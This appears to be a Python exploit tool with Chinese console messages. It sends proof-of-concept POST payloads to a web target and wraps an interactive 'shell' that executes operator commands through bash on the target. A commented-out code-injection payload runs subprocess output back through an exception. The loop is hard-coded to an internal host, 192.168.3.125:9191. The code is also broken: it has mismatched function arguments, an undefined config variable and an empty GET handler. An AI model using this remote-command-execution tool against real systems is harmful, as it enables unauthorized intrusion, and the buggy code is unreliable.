import requests
from .base import *


def exp2(config1, config2, url, command=""):
    save_dir = f"exp_output/res.txt"

    if config1["method"].upper() == "GET":
        return run_get_exp(config, config2, url, save_dir, command)
    elif config1["method"].upper() == "POST":
        return run_post_exp_mul(config1, config2, url, save_dir, command)


def run_get_exp(config, url, save_dir, command):
    print()


def run_post_exp(config, url, save_dir, command):
    session = requests.Session()
    content = ""
    try:
        resp = session.post(url + config["pocUrl"], headers=config["headers"], data=config["data"], verify=False,
                            timeout=config["waitTime"])
        content = resp.text
        res = f"url: {url}\ncommand: {command}\ntime: {nowTime()}\n{content}\n\n"
        # print(greenStr(res))
        appenFile(save_dir, res)
    except Exception as e:
        print(e)
    return res


def exp(config, url, command=""):
    save_dir = f"3-exp_output/res.txt"

    if config["method"].upper() == "GET":
        return run_get_exp(config, url, save_dir, command)
    elif config["method"].upper() == "POST":
        return run_post_exp(config, url, save_dir, command)


def run_post_exp_mul(config1, config2, url, save_dir, command):
    content1 = sand(config1, url).text
    content2 = sand(config2, url).text

    content = greenStr(f"第一个包的响应为--->:\n {content1}\n\n第二个包的响应为--->:\n {content2}\n\n")

    res = f"url: {url}\ncommand: {command}\ntime: {nowTime()}\n{content}\n\n"
    appenFile(save_dir, res)
    return content


def shell(cmd, url):
    # command = f"['bash','-c','find /{cmd} -iname wochao.txt']"
    command = f"['bash','-c','{cmd}']"
    # config["data"] = "{\"code\": \"@exec(\\\"raise Exception(__import__('subprocess').check_output(" + command + "))\\\")\\ndef foo():\\n  pass\", \"a7fb98s8pvr\": \"=\"}"

    resp = exp(config, url, command)
    print(f"结果为： {resp}")
    if resp and "'" in resp:
        res = resp.split("'")[1].replace("\\\\r", "").split("\\\\n")
        for i in res:
            print(i)
    else:
        print("[-] 响应为空或格式不符合预期")
        print(resp)
    print(resp)

    while 1:
        try:
            cmd = input("请输入命令： ").strip()
            if cmd == "exit":
                break
            if cmd == "":
                continue
            url = "http://192.168.3.125:9191"
            shell(cmd, url)
        except Exception as e:
            print(redStr(e))


def exp_main():
    print()


if __name__ == '__main__':
    exp_main()
